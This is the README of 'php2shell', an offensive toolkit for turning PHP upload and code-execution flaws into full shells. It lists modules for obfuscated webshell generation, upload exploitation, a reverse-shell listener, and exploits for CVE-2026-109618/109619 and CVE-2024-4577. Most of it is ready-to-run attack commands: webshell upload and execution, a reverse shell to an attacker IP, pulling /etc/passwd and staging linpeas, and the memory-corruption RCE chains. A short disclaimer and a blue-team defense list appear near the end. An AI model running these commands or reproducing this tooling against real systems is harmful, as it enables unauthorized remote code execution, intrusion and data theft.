# php2shell v2.0

> PHP **File-Upload / Code-Execution → Full Shell** toolkit + **PHP2Shell CVE-2026-109618 / CVE-2026-109619** modules.
> Pure Python 3 standard library — zero dependencies, no pip. Built for BlackArch / Linux terminals.

```
  ____  _  _ ____    ____  _          _ _
 |  _ \| || |  _ \  / ___|| |__   ___| | |
 | |_) | || |_|  _)  \___ \| '_ \ / _ \ | |
 |  __/|__   _| |__ ____) | | | |  __/ | |
 |_|      |_| \___|_____/|_| |_|\___|_|_|
   PHP upload / code-exec -> shell + PHP2Shell CVEs
```

---

## ⚠️ LEGAL DISCLAIMER

This tool is for **EDUCATIONAL PURPOSES and AUTHORIZED SECURITY TESTING ONLY**.
Use it exclusively on systems you **own** or have **explicit written permission** to test.
Unauthorized access to computer systems is a crime in most jurisdictions.
The authors take no responsibility for misuse.

---

## Features

- **Interactive wizard** — run with no arguments: paste a URL, get a target profile, pick attacks from an adaptive menu
- **10 modules** covering the full chain: payload generation → upload exploitation → shell management → CVE checks
- **Smart terminal UI** — auto colors on TTY (`P2S_FORCE_COLOR=1` to force, `NO_COLOR=1` to disable), clean piped output
- **6 obfuscators** — base64, raw-deflate(gzinflate), hex2bin, string-splitting, dynamic function names, GIF89a magic bytes
- **Full listener** — reverse shell catcher with auto-PTY upgrade, in-session `.download` / `.upload`, Ctrl-C forwarding
- **WAF-aware** — browser-like User-Agent, Cloudflare-block detection with guidance

## Requirements

- Python **3.8+** (developed/tested on 3.12 and 3.14)
- Linux terminal recommended (PTY upgrade needs `/bin/bash` on target)

## Installation

```bash
git clone https://github.com/liztrr01/php2shell.git
cd php2shell
chmod +x php2shell.py
```

No dependencies to install — standard library only.

## Quick start

```bash
# interactive wizard (recommended for beginners)
python3 php2shell.py

# or direct module usage
python3 php2shell.py scan -u http://TARGET --active
```

## Modules

| Module   | What it does |
|----------|--------------|
| `wizard`  | interactive guided mode: paste a URL → target profile → adaptive attack menu |
| `gen`     | generate PHP payloads: `cmd` / `reverse` / `bind` + 6 obfuscators + magic bytes |
| `listen`  | catch reverse shells — auto PTY (`.upgrade`), `.download` / `.upload` escapes |
| `upload`  | exploit an unrestricted upload endpoint (multipart POST, fields, cookies, auto-verify) |
| `exec`    | drive an uploaded cmd-shell over HTTP — `download` / `upload` / `cd` tracking |
| `check`   | probe URLs to find where your shell landed (`?p2s_ping=1` → `P2S_ALIVE`) |
| `encode`  | chain-encode strings (`b64,hex,gzip,url`) + emit matching PHP `eval()` wrapper |
| `scan`    | fingerprint PHP version + detect CVE-2026-109618/109619 (safe init-OOM probe) |
| `oom`     | CVE-2026-109618 exploit attempt — OOM → fake array dtor → `system()` |
| `uaf`     | CVE-2026-109619 exploit attempt — stale request-state UAF (experimental) |
| `cgi`     | CVE-2024-4577 PHP-CGI argument injection (Windows locales) |

## Usage examples

**Classic file-upload → shell:**
```bash
python3 php2shell.py gen -t cmd -o shell.php --obf gzip --magic -k s3cr3t
python3 php2shell.py upload -u http://target/upload.php --name shell.phtml \
    --obf concat --magic --paths paths.txt -k s3cr3t
python3 php2shell.py exec -u http://target/uploads/shell.php -p cmd -k s3cr3t
```

**Reverse shell:**
```bash
python3 php2shell.py gen -t reverse --ip 10.0.0.5 --port 4444 -o rev.php
python3 php2shell.py listen --port 4444          # then trigger rev.php on target
# inside listener:  .upgrade  |  .download /etc/passwd  |  .upload linpeas.sh /tmp/lp.sh
```

**PHP2Shell CVEs (October 2026 emergency):**
```bash
python3 php2shell.py scan -u http://target --active                 # solid detector
python3 php2shell.py oom  -u http://target --dry-run                # payload map (educational)
python3 php2shell.py oom  -u http://target --leak-out leak.txt      # memory leak probe
python3 php2shell.py oom  -u http://target --heap-addr 0x.. --system-addr 0x.. --cmd id
python3 php2shell.py uaf  -u http://target --pin 20 --dry-run
python3 php2shell.py cgi  -u http://target --shell                  # CVE-2024-4577
```

## PHP2Shell background (CVE-2026-109618 / CVE-2026-109619)

Disclosed 2026-10-20, patched 2026-10-21 (PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12), CVSS 9.2.
Any PHP runtime serving HTTP is in scope (mod_php, FPM, php-cgi, FrankenPHP, LiteSpeed).
The trigger fires **during request initialization** — application auth cannot block it.

- **CVE-2026-109618** — OOM during `$_POST` building leaves an incomplete hash bucket; cleanup
  reads attacker bytes as a `zend_array` → `pDestructor = &system()` → unauthenticated RCE.
  Exploit chain: 276-byte groom (fake zval/array/bucket) → `a=1` reallocation → oversized
  `[x]`-suffixed field name exceeding `memory_limit`.
- **CVE-2026-109619** — worker keeps stale request state (session upload progress /
  fatal error backtraces) that a second request on the same worker can consume → UAF.

**Reliability notes (honest):** `scan` is a solid detector (version + behavior signature
`Allowed memory size ... exhausted ... in Unknown on line 0`). `oom`/`uaf` require
target-build addresses (heap + `system()`) — obtain via `--leak-out` or a same-image lab;
wrong addresses crash workers. Defenses: update PHP, `memory_limit=-1`,
`session.upload_progress.enabled=0`, `fatal_error_backtraces=0`.

## Defense guide (for blue teams)

- Validate uploads with an extension allowlist + real content checks (magic bytes)
- Store uploads **outside** the web root; randomize filenames
- `disable_functions` (exec family) + `open_basedir` + least-privilege PHP-FPM pools
- Never expose `X-Powered-By`; rate-limit large form submissions
- Detect: init-time memory-exhaustion errors, web workers spawning shells

## Testing targets (legal practice)

- **Metasploitable 2** — classic VM, perfect for gen/upload/exec/listen modules
- **DVWA / Mutillidae** — web app vulnerabilities
- **Your own PHP 8.3.35 VM** — last version before the PHP2Shell patch (great for `scan`/`oom` dry-run)
- Any system you own or hold written authorization for

## References

- PHP.net security advisory (2026-10-21 emergency release)
- Datadog Security Labs — "PHP2Shell: Critical Vulnerabilities in PHP"
- Wiz / watchTowr / Rapid7 / Sophos analyses

## License

MIT — see [LICENSE](LICENSE). Educational and authorized security testing only.
